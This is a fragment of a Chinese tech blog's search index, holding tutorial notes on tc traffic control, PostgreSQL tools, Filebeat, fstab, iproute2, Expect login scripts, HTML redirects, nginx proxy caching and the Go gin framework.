bounded\n\n对于bounded命令应慎用，一旦添加后就进行修改，只可通过删除后再添加来实现。\n\n删除\n\n删除动作只在该分类没有工作前才可进行，一旦通过该分类发送过数据，则无法删除它了。因此，需要通过shell文件方式来修改，通过重新启动来完成删除动作。\n\n3）过滤器的维护\n\n增添\n\n增添动作通过tc filter add命令实现，如前面所示。\n\n修改\n\n修改动作通过tc filter change命令实现，如下所示：\n\n·tc filter change dev eth0 parent 1:0 protocol ip prio 100 route to 10 flowid 1:8\n\n删除\n\n删除动作通过tc filter del命令实现，如下所示：\n\n·tc filter del dev eth0 parent 1:0 protocol ip prio 100 route to 10\n\n4）与过滤器一一映射路由的维护\n\n增添\n\n增添动作通过ip route add命令实现，如前面所示。\n\n修改\n\n修改动作通过ip route change命令实现，如下所示：\n\nip route change 192.168.1.30 dev eth0 via 192.168.1.66 realm 8\n\n删除\n\n删除动作通过ip route del命令实现，如下所示：\n\nip route del 192.168.1.30 dev eth0 via 192.168.1.66 realm 8\nip route del 192.168.1.0/24 dev eth0 via 192.168.1.66 realm 4\n\nhttp://blog.itpub.net/13794466/viewspace-712058/\n-TC流量控制：--\n我们只能对发送数据进行整形\n默认整形方式是Pfifo_fast队列规定。特点为先进先出。只看数据包的TOS字节节来判断应该放到哪个频道(优先).一般的应用程序会如何设置他们的TOS值。\nHTB分层的令牌桶\nHTB 可以保障提供给每个类带宽的数量是它所需求的最小需求或者等于分配给它的数量.当一个类需要的带宽少于分配的带宽时,剩余的带宽被分配给其他需要服务的类.\n\nSFQ随机公平队列\n简单轮转。使用一个散列算法，把所有的会话映射到有限的几个队列中去。(只有当你的出口网卡确实已经挤满了的时候,SFQ才会起作用)\n\n（如果你并不希望进行流量整形，只是想看看你的网卡是否有比较高的负载而需要使用队列，可使用pfifo队列。它缺乏内部频道但是可以统计backlog）\n\n--HTB应用案例4--\n1)\ntc qdisc add dev eth0 root handle 1: htb default 12\n2)\ntc class add dev eth0 parent 1: classid 1:1 htb rate 100kbps ceil 100kbps\ntc class add dev eth0 parent 1:1 classid 1:10 htb rate 30kbps ceil 100kbps\ntc class add dev eth0 parent 1:1 classid 1:11 htb rate 10kbps ceil 100kbps\ntc class add dev eth0 parent 1:1 classid 1:12 htb rate 60kbps ceil 100kbps\n3)为队列规定分配子类, 如果没有指定缺省是pfifo\ntc qdisc add dev eth0 parent 1:10 handle 20: pfifo limit 5\ntc qdisc add dev eth0 parent 1:11 handle 30: pfifo limit 5\ntc qdisc add dev eth0 parent 1:12 handle 40: sfq perturb 10\n1:12队列的类不定义时，即所有不匹配其它类规则的数据包。\n\n--流量分析与故障诊断--\ntc -s -d qdisc show dev eth0 队列状态\ntc -s class show dev eth0 类状态\ntc filter show dev eth0 过滤器状态","tags":null},{"location":"//blog.pytool.com/Post/数据库/2016-02-29 PostgreSQL","title":"PostgreSQL详解","text":"可视化工具 DBeaver 是一个通用的数据库管理工具和 SQL 客户端，支持 MySQL, PostgreSQL, Oracle, DB2, MSSQL, Sybase, Mimer, HSQLDB, Derby, 以及其他兼容 JDBC 的数据库。DBeaver 提供一个图形界面用来查看数据库结构、执行SQL查询和脚本，浏览和导出数据，处理BLOB/CLOB 数据，修改数据库结构等等。\n\npgweb go get github.com/sosedoff/pgweb\n\npgweb --host localhost --port 5432 --user postgres --db partman\n\nrun pgweb    http://127.0.0.1:8081\n\npgweb 是一个采用 Go 语言开发的基于 Web 的 PostgreSQL 管理系统。\n\nFirst, start PostgreSQL in the container (using official image):\n\ndocker run -d -p 5432:5432 --name db -e POSTGRESPASSWORD=postgres postgres\n\nThen start pgweb container:\n\ndocker run -p 8081:8081 --link db:db -e DATABASEURL=postgres://postgres:postgres@db:5432/\n\nUsage\n\nStart server:\n\npgweb\n\nYou can also provide connection flags:\n\npgweb --host localhost --user myuser --db mydb\n\nConnection URL scheme is also supported:\n\npgweb --url postgres://user:password@host:port/database?sslmode=[mode]\n\nMultiple database sessions\n\nTo enable multiple database sessions in pgweb, start the server with:\n\npgweb --sessions\n\nOr set environment variable:\n\nSESSIONS=1 pgweb","tags":null},{"location":"//blog.pytool.com/Post/数据库/2016-02-29 SQL 总结","title":"SQL 精编","text":"---\n\n SQL 语句与分类，SQL 常见用法，mysql 一些常用函数，数据分析思路，其它 mysql 管理工具\n\n前言\n\nSQL 是结构化查询语言 (Structured Query Language) 的简称\n\nSQL是一套访问和处理数据库的标准和规范，事实上不同数据库对于这套规范的实现各有差异，即便同种数据库不同版本实现出来的也不竟相同 ，但不得不说，因为有了这套规范后，对于数据库的操作变得更容易，绝大部分语句可以不用修改就直接跨数据库(这里指DBMS)执行，也为不同数据库管理系统之间导入导出数据提供了一定的可行性\n\n  个人感觉 SQL 更像是一种交互规范，或者说是 DBMS 的统一API\n\n这里分享一下工作中会用到的一些操作，不是从基础开始，因为 SQL 基础在网上有很多资料，这里主要分享的是一些实用的小技巧和注意事项，如果实现相同效果有更好的方法，欢迎与我探讨，共同交流进步\n\n  Tip: 这篇文章可能会持续更新，因为工作中如果遇到了新的问题，可能会有新的方法，届时就会添加进来，因为这篇的知识很零散并不系统，所以更适合作为字典来查，目前的主要执行环境是 Percona Server 5.6","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elastic filebeat配置详解","title":"filebeat配置详解","text":"Registry File\n\nRegistry File存储了Filbeat最后一次读的位置和状态。\n在Logstash-Forwarder被称为.logstash-fowarder(位于/var/lib/logstash-forwarder/.logstash-forwarder)。\n对于Filebeat需要将其重命名为 .filebeat。\n迁移配置文件\n\n在Filebeat安装完成准备使用前，最好先对Filebeat进行一些详细的配置再使用，下面来详细讲解一下相关内容。\n\nFilebeat的配置文件是/etc/filebeat/filebeat.yml，遵循YAML语法。具体可以配置如下几个项目：\n\n    Filebeat\n    Output\n    Shipper\n    Logging(可选)\n    Run Options（可选）\n\n这个Blog主要讲解Filebeat的配置部分，其他部分后续会有新的Blog介绍。\n\nFilebeat的部分主要定义prospector的列表，定义监控哪里的日志文件，关于如何定义的详细信息可以参考filebeat.yml中的注释，下面主要介绍一些需要注意的地方。\n\n    paths：指定要监控的日志，目前按照Go语言的glob函数处理。没有对配置目录做递归处理，比如配置的如果是：\n\n    /var/log/ /.log\n\n则只会去/var/log目录的所有子目录中寻找以”.log”结尾的文件，而不会寻找/var/log目录下以”.log”结尾的文件。\n\n    encoding：指定被监控的文件的编码类型，使用plain和utf-8都是可以处理中文日志的。\n\n    inputtype：指定文件的输入类型log(默认)或者stdin。\n\n    excludelines：在输入中排除符合正则表达式列表的那些行。\n\n    includelines：包含输入中符合正则表达式列表的那些行（默认包含所有行），includelines执行完毕之后会执行excludelines。\n\n    excludefiles：忽略掉符合正则表达式列表的文件（默认为每一个符合paths定义的文件都创建一个harvester）。\n\n    fields：向输出的每一条日志添加额外的信息，比如“level:debug”，方便后续对日志进行分组统计。默认情况下，会在输出信息的fields子目录下以指定的新增fields建立子目录，例如fields.level。\n\n    fieldsunderroot：如果该选项设置为true，则新增fields成为顶级目录，而不是将其放在fields目录下。自定义的field会覆盖filebeat默认的field。例如添加如下配置：\n\n    fields:\n    level: debug\n    fieldsunderroot: true\n\n    ignoreolder：可以指定Filebeat忽略指定时间段以外修改的日志内容，比如2h（两个小时）或者5m(5分钟)。\n\n    closeolder：如果一个文件在某个时间段内没有发生过更新，则关闭监控的文件handle。默认1h,change只会在下一次scan才会被发现\n\n    forceclosefiles：Filebeat会在没有到达closeolder之前一直保持文件的handle，如果在这个时间窗内删除文件会有问题，所以可以把forceclosefiles设置为true，只要filebeat检测到文件名字发生变化，就会关掉这个handle。\n\n    scanfrequency：Filebeat以多快的频率去prospector指定的目录下面检测文件更新（比如是否有新增文件），如果设置为0s，则Filebeat会尽可能快地感知更新（占用的CPU会变高）。默认是10s。\n\n    documenttype：设定Elasticsearch输出时的document的type字段，也可以用来给日志进行分类。\n\n    harvesterbuffersize：每个harvester监控文件时，使用的buffer的大小。\n\n    maxbytes：日志文件中增加一行算一个日志事件，maxbytes限制在一次日志事件中最多上传的字节数，多出的字节会被丢弃。\n\n    multiline：适用于日志中每一条日志占据多行的情况，比如各种语言的报错信息调用栈。这个配置的下面包含如下配置：\n\n    tailfiles：如果设置为true，Filebeat从文件尾开始监控文件新增内容，把新增的每一行文件作为一个事件依次发送，而不是从文件开始处重新发送所有内容。\n\n    backoff：Filebeat检测到某个文件到了EOF之后，每次等待多久再去检测文件是否有更新，默认为1s。\n\n    maxbackoff：Filebeat检测到某个文件到了EOF之后，等待检测文件更新的最大时间，默认是10秒。\n\n    backofffactor：定义到达maxbackoff的速度，默认因子是2，到达maxbackoff后，变成每次等待maxbackoff那么长的时间才backoff一次，直到文件有更新才会重置为backoff。\n\n如果设置成1，意味着去使能了退避算法，每隔backoff那么长的时间退避一次。\n\n    spoolsize:spooler的大小，spooler中的事件数量超过这个阈值的时候会清空发送出去（不论是否到达超时时间）。\n\n    idletimeout:spooler的超时时间，如果到了超时时间，spooler也会清空发送出去（不论是否到达容量的阈值）。\n\n    registryfile:记录filebeat处理日志文件的位置的文件\n\n    configdir:如果要在本配置文件中引入其他位置的配置文件，可以写在这里（需要写完整路径），但是只处理prospector的部分。\n\n    publishasync：是否采用异步发送模式（实验功能）。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 fstab","title":"Linux命令 fstabl","text":"挂载Windows ntfs\n\n/dev/sda2 /mnt/sda2 auto rw,nodev,user,owner,nodiratime,noatime,umask=033,uid=1000,gid=1000,nofail 0 0\n\ntime sync\n\nfstab文件介绍\n\nfstab文件包含了你的电脑上的存储设备及其文件系统的信息。它是决定一个硬盘（分区）被怎样使用或者说整合到整个系统中的文件。具体来说：用fstab可以自动挂载各种文件系统格式的硬盘、分区、可移动设备和远程设备等。对于Windows与Linux双操作系统用户，用fstab挂载FAT格式和NTFS格式的分区，可以在Linux中共享windows系统下的资源。\n\n这个文件的全路径是/etc/fstab。它只是一个文本文件，你能够用你喜欢的编辑器打开它，但是必须是root用户才能编辑它。同时fsck、mount、umount的等命令都利用该程序。\n\n/etc/fstab 是启动时的配置文件，不过，实际 filesystem 的挂载是记录到 /etc/mtab 与 /proc/mounts 这两个文件当中的。每次我们在更动 filesystem 的挂载时，也会同时更动这两个文件喔！\n系统挂载的一些限制：\n\n        根目录 / 是必须挂载的﹐而且一定要先于其它 mount point 被挂载进来。\n        其它 mount point 必须为已创建的目录﹐可任意指定﹐但一定要遵守必须的系统目录架构原则\n        所有 mount point 在同一时间之内﹐只能挂载一次。\n        所有 partition 在同一时间之内﹐只能挂载一次。\n        如若进行卸除﹐您必须先将工作目录移到 mount point(及其子目录) 之外。\n\n文件各字段解释\n\n示例：\n\n fs            mountpoint    type        opts        dump/pass\n\nNOTE: If your BOOT partition is ReiserFS, add the notail option to opts.\n\n/dev/sda10        /boot            ext4        noauto,noatime    1 2\n/dev/sda6         /                ext4        noatime           0 1\n/dev/sda9         none             swap        sw                0 0\n/dev/cdrom        /mnt/cdrom       auto        noauto,ro         0 0\n\n其实 /etc/fstab (filesystem table) 就是将我们利用 mount 命令进行挂载时， 将所有的选项与参数写入到这个文件中就是了。除此之外， /etc/fstab 还加入了 dump 这个备份用命令的支持！ 与启动时是否进行文件系统检验 fsck 等命令有关。\n\n        file systems 挂载设备 : 不是我们通常理解的文件系统，而是指设备（硬盘及其分区，DVD光驱等）。它告知我们设备（分区）的名字，这是你在命令行中挂载（mount）、卸载（umount）设备时要用到的。\n        mountpoint 挂载点：告诉我们设备挂载到哪里。\n        type 文件系统类型：Linux支持许多文件系统。 要得到一个完整的支持名单查找mount man-page。典型 的名字包括这些：ext2, ext3, reiserfs, xfs, jfs,iso9660, vfat, ntfs, swap和auto, 'auto' 不是一个文件系统，而是让mount命令自动判断文件类型，特别对于可移动设备，软盘，DVD驱动器，这样做是很有必要的，因为可能每次挂载的文件类型不一致。\n        opts 文件系统参数：这部分是最有用的设置！！！ 它能使你所挂载的设备在开机时自动加载、使中文显示不出现乱码、限制对挂载分区读写权限。它是与mount命令的用法相关的，要想得到一个完整的列表，参考mount manpage.\n        dump 备份命令：dump utility用来决定是否做备份的. dump会检查entry并用数字来决定是否对这个文件系统进行备份。允许的数字是0和1。如果是0，dump就会忽略这个文件系统，如果是1，dump就会作一个备份。大部分的用户是没有安装dump的，所以对他们而言dump这个entry应该写为0。\n        pass 是否以fsck检验扇区：启动的过程中，系统默认会以fsck检验我们的 filesystem 是否完整 (clean)。 不过，某些 filesystem 是不需要检验的，例如内存置换空间 (swap) ，或者是特殊文件系统例如 /proc 与 /sys 等等。fsck会检查这个头目下的数字来决定检查文件系统的顺序，允许的数字是0, 1, 和2。0 是不要检验， 1 表示最早检验(一般只有根目录会配置为 1)， 2 也是要检验，不过1会比较早被检验啦！一般来说,根目录配置为1,其他的要检验的filesystem都配置为 2 就好了。\n\nopts常用参数：\n\n    noatime 关闭atime特性，提高性能，这是一个很老的特性，放心关闭，还能减少loadcycle\n    defaults 使用默认设置。等于rw,suid,dev,exec,auto,nouser,async，具体含义看下面的解释。\n    自动与手动挂载:\n    auto 在启动或在终端中输入mount -a时自动挂载\n    noauto 设备（分区）只能手动挂载\n    读写权限:\n    ro 挂载为只读权限\n    rw 挂载为读写权限\n    可执行:\n    exec 是一个默认设置项，它使在那个分区中的可执行的二进制文件能够执行\n    noexec 二进制文件不允许执行。千万不要在你的root分区中用这个选项！！！\n    I/O同步:\n    sync 所有的I/O将以同步方式进行\n    async 所有的I/O将以非同步方式进行\n    户挂载权限:\n    user 允许任何用户挂载设备。 Implies noexec,nosuid,nodev unless overridden.\n    nouser 只允许root用户挂载。这是默认设置。\n    临时文件执行权限：\n    suid Permit the operation of suid, and sgid bits. They are mostly used to allow users on a computer system to execute binary executables with temporarily elevated privileges in order to perform a specific task.\n    nosuid Blocks the operation of suid, and sgid bits.\n\n重启系统\n\n重启系统，或在终端中输入mount -a就可以看到修改后的效果了。","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/iproute2学习笔记","title":"Linux命令 Iproute2","text":"---\n\niproute2学习笔记\n\n一、替代arp, ifconfig, route等命令\n显示网卡和IP地址\n\nroot@openstack:~\\# ip link list\n1: lo: \u0026lt;LOOPBACK,UP,LOWER\\UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER\\UP\u0026gt; mtu 1500 qdisc pfifo\\fast state UP qlen 1000\n    link/ether 64:31:50:43:57:fa brd ff:ff:ff:ff:ff:ff\n4: br-ex: \u0026lt;BROADCAST,UP,LOWER\\UP\u0026gt; mtu 1500 qdisc noqueue state UNKNOWN\n    link/ether 64:31:50:43:57:fa brd ff:ff:ff:ff:ff:ff\n7: br-int: \u0026lt;BROADCAST,UP,LOWER\\UP\u0026gt; mtu 1500 qdisc noqueue state UNKNOWN\n    link/ether a2:99:53:93:1b:47 brd ff:ff:ff:ff:ff:ff\n10: virbr0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER\\UP\u0026gt; mtu 1500 qdisc noqueue state UP\n    link/ether fe:54:00:68:e0:04 brd ff:ff:ff:ff:ff:ff\n35: br-tun: \u0026lt;BROADCAST,UP,LOWER\\UP\u0026gt; mtu 1500 qdisc noqueue state UNKNOWN\n    link/ether 42:9b:ec:6c:f6:41 brd ff:ff:ff:ff:ff:ff\n71: qbrf38a666d-f5: \u0026lt;BROADCAST,MULTICAST,UP,LOWER\\UP\u0026gt; mtu 1500 qdisc noqueue state UP\n    link/ether 96:e0:4d:68:c2:6b brd ff:ff:ff:ff:ff:ff\n72: qvof38a666d-f5: \u0026lt;BROADCAST,MULTICAST,PROMISC,UP,LOWER\\UP\u0026gt; mtu 1500 qdisc pfifo\\fast state UP qlen 1000\n    link/ether 66:9e:9a:e1:25:37 brd ff:ff:ff:ff:ff:ff\n73: qvbf38a666d-f5: \u0026lt;BROADCAST,MULTICAST,PROMISC,UP,LOWER\\UP\u0026gt; mtu 1500 qdisc pfifo\\fast master qbrf38a666d-f5 state UP qlen 1000\n    link/ether 96:e0:4d:68:c2:6b brd ff:ff:ff:ff:ff:ff\n74: tapf38a666d-f5: \u0026lt;BROADCAST,MULTICAST,UP,LOWER\\UP\u0026gt; mtu 1500 qdisc pfifo\\fast master qbrf38a666d-f5 state UNKNOWN qlen 500\n    link/ether fe:16:3e:3d:68:e4 brd ff:ff:ff:ff:ff:ff\nroot@openstack:~\\# ip address show\n1: lo: \u0026lt;LOOPBACK,UP,LOWER\\UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid\\lft forever preferred\\lft forever\n    inet6 ::1/128 scope host\n       valid\\lft forever preferred\\lft forever\n2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER\\UP\u0026gt; mtu 1500 qdisc pfifo\\fast state UP qlen 1000\n    link/ether 64:31:50:43:57:fa brd ff:ff:ff:ff:ff:ff\n    inet 16.158.165.152/22 brd 16.158.167.255 scope global eth0\n       valid\\lft forever preferred\\lft forever\n    inet6 fe80::6631:50ff:fe43:57fa/64 scope link\n       valid\\lft forever preferred\\_lft forever\n\n显示路由\n\nroot@openstack:~\\# ip route show\ndefault via 16.158.164.1 dev br-ex\n16.158.164.0/22 dev br-ex  proto kernel  scope link  src 16.158.165.102\n16.158.164.0/22 dev eth0  proto kernel  scope link  src 16.158.165.152\n192.168.122.0/24 dev virbr0  proto kernel  scope link  src 192.168.122.1\n\n显示ARP\n\nroot@openstack:~\\# ip neigh show\n16.158.165.47 dev br-ex lladdr e4:11:5b:53:62:00 STALE\n192.168.122.61 dev virbr0 lladdr 52:54:00:68:e0:04 STALE\n16.158.164.1 dev br-ex lladdr 00:00:5e:00:01:15 DELAY\n16.158.166.177 dev br-ex lladdr 00:26:99:d0:12:a9 STALE\n16.158.164.3 dev br-ex lladdr 20:fd:f1:e4:c9:e8 STALE\n16.158.165.87 dev br-ex lladdr 70:5a:b6:b3:dd:a5 STALE\n16.158.166.150 dev br-ex  FAILED\n16.158.164.2 dev br-ex lladdr 20:fd:f1:e4:c9:b1 STALE\n\n二、Rules: Routing Policy\n\nRouting Table其实有三个：local, main, default\n\nroot@openstack:~\\# ip rule list\n0:      from all lookup local\n32766:  from all lookup main\n32767:  from all lookup default\n\n原来的route命令修改的是main和local表\n\nroot@openstack:~\\# ip route list table local\nbroadcast 16.158.164.0 dev br-ex  proto kernel  scope link  src 16.158.165.102\nbroadcast 16.158.164.0 dev eth0  proto kernel  scope link  src 16.158.165.152\nlocal 16.158.165.102 dev br-ex  proto kernel  scope host  src 16.158.165.102\nlocal 16.158.165.152 dev eth0  proto kernel  scope host  src 16.158.165.152\nbroadcast 16.158.167.255 dev br-ex  proto kernel  scope link  src 16.158.165.102\nbroadcast 16.158.167.255 dev eth0  proto kernel  scope link  src 16.158.165.152\nbroadcast 127.0.0.0 dev lo  proto kernel  scope link  src 127.0.0.1\nlocal 127.0.0.0/8 dev lo  proto kernel  scope host  src 127.0.0.1\nlocal 127.0.0.1 dev lo  proto kernel  scope host  src 127.0.0.1\nbroadcast 127.255.255.255 dev lo  proto kernel  scope link  src 127.0.0.1\nbroadcast 192.168.122.0 dev virbr0  proto kernel  scope link  src 192.168.122.1\nlocal 192.168.122.1 dev virbr0  proto kernel  scope host  src 192.168.122.1\nbroadcast 192.168.122.255 dev virbr0  proto kernel  scope link  src 192.168.122.1\n\nroot@openstack:~\\# ip route list table main\ndefault via 16.158.164.1 dev br-ex\n16.158.164.0/22 dev br-ex  proto kernel  scope link  src 16.158.165.102\n16.158.164.0/22 dev eth0  proto kernel  scope link  src 16.158.165.152\n192.168.122.0/24 dev virbr0  proto kernel  scope link  src 192.168.122.1\nroot@openstack:~\\# ip route list table default\n\nSimple source policy routing","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 expect详解","title":"Linux命令 expect详解","text":"linux expect详解(ssh自动登录) - 懒惰的肥兔 - 博客园\nshell脚本实现ssh自动登录远程服务器示例:\n复制代码\n\n!/usr/bin/expect\nspawn ssh root@192.168.22.194\nexpect \"password:\"\nsend \"123\\r\"\nexpect \"\"\ninteract\n\n复制代码\n\n原文链接：http://www.xuanhao360.com/linux-expects/\n\nExpect是一个用来处理交互的命令。借助Expect，我们可以将交互过程写在一个脚本上，使之自动化完成。形象的说，ssh登录，ftp登录等都符合交互的定义。下文我们首先提出一个问题，然后介绍基础知四个命令，最后提出解决方法。\n问题\n\n    如何从机器A上ssh到机器B上，然后执行机器B上的命令？如何使之自动化完成？\n\n四个命令\n\nExpect中最关键的四个命令是send,expect,spawn,interact。\n\nsend：用于向进程发送字符串\nexpect：从进程接收字符串\nspawn：启动新的进程\ninteract：允许用户交互\n\nsend命令\n\nsend命令接收一个字符串参数，并将该参数发送到进程。\n\nexpect1.1  send \"hello world\\n\"\nhello world\n\nexpect命令\n(1)基础知识\n\nexpect命令和send命令正好相反，expect通常是用来等待一个进程的反馈。expect可以接收一个字符串参数，也可以接收正则表达式参数。和上文的send命令结合，现在我们可以看一个最简单的交互式的例子：\n\nexpect \"hi\\n\"\nsend \"hello there!\\n\"\n\n这两行代码的意思是：从标准输入中等到hi和换行键后，向标准输出输出hello there。\n\ntips： $expectout(buffer)存储了所有对expect的输入，$expectout(0,string)存储了匹配到expect参数的输入。\n\n比如如下程序：\n\nexpect \"hi\\n\"\nsend \"you typed $expectout(buffer)\"\nsend \"but I only expected $expectout(0,string)\"\n\n当在标准输入中输入\n\ntest\nhi\n\n是，运行结果如下\n\nyou typed: test\nhi\nI only expect: hi\n\n(2)模式-动作\n\nexpect最常用的语法是来自tcl语言的模式-动作。这种语法极其灵活，下面我们就各种语法分别说明。\n\n单一分支模式语法：\n\nexpect \"hi\" {send \"You said hi\"}\n\n匹配到hi后，会输出\"you said hi\"\n\n多分支模式语法：\n\nexpect \"hi\" { send \"You said hi\\n\" } \\\n\"hello\" { send \"Hello yourself\\n\" } \\\n\"bye\" { send \"That was unexpected\\n\" }\n\n匹配到hi,hello,bye任意一个字符串时，执行相应的输出。等同于如下写法：\n\nexpect {\n\"hi\" { send \"You said hi\\n\"}\n\"hello\" { send \"Hello yourself\\n\"}\n\"bye\" { send \"That was unexpected\\n\"}\n}\n\nspawn命令\n\n上文的所有demo都是和标准输入输出进行交互，但是我们跟希望他可以和某一个进程进行交互。spawm命令就是用来启动新的进程的。spawn后的send和expect命令都是和spawn打开的进程进行交互的。结合上文的send和expect命令我们可以看一下更复杂的程序段了。\n\nset timeout -1\nspawn ftp ftp.test.com      //打开新的进程，该进程用户连接远程ftp服务器\nexpect \"Name\"             //进程返回Name时\nsend \"user\\r\"        //向进程输入anonymous\\r\nexpect \"Password:\"        //进程返回Password:时\nsend \"123456\\r\"    //向进程输入don@libes.com\\r\nexpect \"ftp  \"            //进程返回ftp  时\nsend \"binary\\r\"           //向进程输入binary\\r\nexpect \"ftp  \"            //进程返回ftp  时\nsend \"get test.tar.gz\\r\"  //向进程输入get test.tar.gz\\r\n\n这段代码的作用是登录到ftp服务器ftp ftp.uu.net上，并以二进制的方式下载服务器上的文件test.tar.gz。程序中有详细的注释。\n4.interact\n\n到现在为止，我们已经可以结合spawn、expect、send自动化的完成很多任务了。但是，如何让人在适当的时候干预这个过程了。比如下载完ftp文件时，仍然可以停留在ftp命令行状态，以便手动的执行后续命令。interact可以达到这些目的。下面的demo在自动登录ftp后，允许用户交互。\n\nspawn ftp ftp.test.com\nexpect \"Name\"\nsend \"user\\r\"\nexpect \"Password:\"\nsend \"123456\\r\"\ninteract\n\n解决方法\n\n上文中提到：\n\n    如何从机器A上ssh到机器B上，然后执行机器B上的命令？如何使之自动化完成？\n\n下面一段脚本实现了从机器A登录到机器B，然后执行机器B上的pwd命令，并停留在B机器上，等待用户交互。具体含义请参考上文。\n\n!/home/tools/bin/64/expect -f\n set timeout -1  \n spawn ssh $BUser@$BHost\n expect  \"password:\" { send \"$password\\r\" }\n expect  \"$\" { send \"pwd\\r\" }\n interact","tags":null},{"location":"//blog.pytool.com/Other/2017-07-11 html实现网页跳转","title":"html实现网页","text":"纯html页面跳转\n\nhead\nmeta http-equiv=\"refresh\" content=\"10; url=http://www.baidu.com\"\n/head\n\n javaScript 跳转\n\n方法一:\nscript language=\"javascript\"\n    window.location = \"http://www.baidu.com\";\n/script\n方法二:\nscript language=\"javascript\"\n    document.location = \"http://www.baidu.com\";\n/script\n\nhtml\n  head\n    title正在跳转/title\n  /head\nbody\nscript language='javascript'document.location = '/websitems/'/script\n/body\n/html\n\n（带进度条）\n\nhtml\nhead\nmeta http-equiv=\"Content-Language\" content=\"zh-cn\"\nmeta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html; charset=gb2312\"\ntitle跳转到baidu.com/title\n/head\nbody\nform name=loading\nP align=centerFONT face=Arial color=#0066ff size=2loading.../FONT\n","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx proxy cache","title":"Linux命令 Nginx proxy cache","text":"【译】Ngnix实现一个缓存和缩略处理的反向代理服务器 - QueenKing - SegmentFault\nLinux 运维 » Nginx 代理 配置详解\n\n3.Proxy Cache配置详解\nProxy Cache机制依赖于Proxy Buffer机制，只有当Buffer(默认开启)开启的时候，Cache才能使用\n\n3.1\nproxycache zone | off;\n配置一块用于公用的内存区域名称，该区域可以存放缓存的索引数据\nzone 设置用于存放缓存索引的内存区域的名称\noff  关闭proxycache功能，默认为关闭的\n\n3.2\nproxycachebypass string..........；\n配置nginx服务器向客户端发送响应数据时，不从缓存中获取的条件\nstring 为条件变量\neg:\n  proxycachebypass $cookienocache;\n\n3.3\nproxycachekey string;\n配置nginx服务器在内存中为缓存数据建立索引时使用的关键字\nstring 为设置的关键字\n通常使用以下配置\n eg :\n    proxycachekey \"$scheme$proxyhost$uri$isargs$args\";\n\n3.4\nproxycachelock on|off;\n设置是否开启缓存锁的功能，默认为关闭状态\n\n3.5\nproxycachelocktimeout time;\n设置缓存锁功能开启以后锁的超时时间，默认为5\n\n3.6\nproxycacheminuses number;\n设置客户请求发送的次数，当客户端向被代理服务器发送相同请求到达一定的次数后，nginx才对请求进行缓存，默认为1\n\n3.7\nproxycachepath path [levels=levels] keyszone=name:size [inactive=time] [maxsize=size2] [loaderfiles=number] [loadersleep=time2] [loaderthreshold=time3];\n设置nginx服务器存储数据的路径以及和缓存索引相关的内容\npath 设置缓存数据存放的根路径，此路径必须存在\nlevels 设置相对于path指定目录的第几级hash目录中缓存数据\n        设置缓存目录层数，如levels=1:2，表示创建两层目录缓存，最多创建三层。第一层目录名取proxycachekey md5的最后一个字符，第二层目录名取倒数2-3字符，如：\n        proxycachekey md5为b7f54b2df7773722d382f4809d65029c，则：\n        levels=1:2为/data/nginx/cache/c/29/b7f54b2df7773722d382f4809d65029c\n        levels=1:2:3为/data/nginx/cache/c/29/650/b7f54b2df7773722d382f4809d65029c\nkeyszone=name:size：用于设置存放缓存索引的内存区域的名称和大小\n        定义缓存区域名称及大小，缓存名称用于proxycache指令设置缓存放置在哪，如proxycache one，则把缓存放在zone名称为one的缓存区，即proxycachepath指定的具体位置。\n\ninactive=time 设置强制更新缓存数据的时间 默认为10s\nmaxsize=size2 设置硬盘中缓存数据的大小限制\nloaderfiles=100 设置缓存索引重建进程每次加载的数据袁术的数量上限，默认为100\nloadersleep=50ms 设置缓存索引重建进程在一次遍历结束，下一次遍历开始之间的暂停时间，默认为50ms\nloaderthreshold=200ms 设置遍历一次磁盘缓存源数据的时间上限，默认为200ms\neg:\n   proxycachepath /home/cache levels=1:2 keyszone=cacheone:200m inactive=1d maxsize=30g;\n\n3.8\nproxycacheusestale error|timeout|invalidheader|updating|http500|http502|http503|http504|http404 | off .....;\n设置nginx在访问被代理服务器过程中出现被代理服务器无法访问或者访问错误等现象时，nginx服务器可以使用历史缓存响应客户端，该指令默认为off\n\n3.9\nproxycachevalid [ code ....] time;\n设置对不同的HTTP响应状态设置不同的缓存时间\ncode 设置响应状态，nginx 职位http状态代码为200 301  302做缓存，可以使用any表示所有该指令中为设置的其他响应数据\ntime 设置缓存时间\neg:\n   proxycachevalid 200 302 1h;\n   proxycachevalid 301 1h;\n   proxycachevalid any 1m;\n\n3.10\nproxyno_cache string;\n设置什么情况下不使用cache","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang gin","title":"Go语言web框架 gin","text":"gin是go语言环境下的一个web框架, 它类似于Martini, 官方声称它比Martini有更好的性能, 比Martini快40倍, Ohhhh....看着不错的样子, 所以就想记录一下gin的学习. gin的github代码在这里: gin源码. gin的效率获得如此突飞猛进, 得益于另一个开源项目httprouter, 项目地址: httprouter源码. 下面主要记录一下gin的使用.\n\ngin-contrib\n\n项目列表\nhttps://github.com/demo-apps/go-gin-app.git\nhttps://github.com/sanathb/go-gin-onboarding\n\n Generate REST API boilerplate code for gin web framework\ngo get github.com/aiyi/swagger-gin\n\n安装gin\n使用命令go get github.com/gin-gonic/gin就可以. 我们使用gin的时候引入相应的包就OKimport \"github.com/gin-gonic/gin\".\n\n使用方法\n1 一种最简单的使用GET/POST方法\n\ngin服务端代码是:\n\n// func1: 处理最基本的GET\nfunc func1 (c gin.Context)  {\n    // 回复一个200OK,在client的http-get的resp的body中获取数据\n    c.String(http.StatusOK, \"test1 OK\")\n}\n// func2: 处理最基本的POST\nfunc func2 (c gin.Context) {\n    // 回复一个200 OK, 在client的http-post的resp的body中获取数据\n    c.String(http.StatusOK, \"test2 OK\")\n}\nfunc main(){\n    // 注册一个默认的路由器\n    router := gin.Default()\n    // 最基本的用法\n    router.GET(\"/test1\", func1)\n    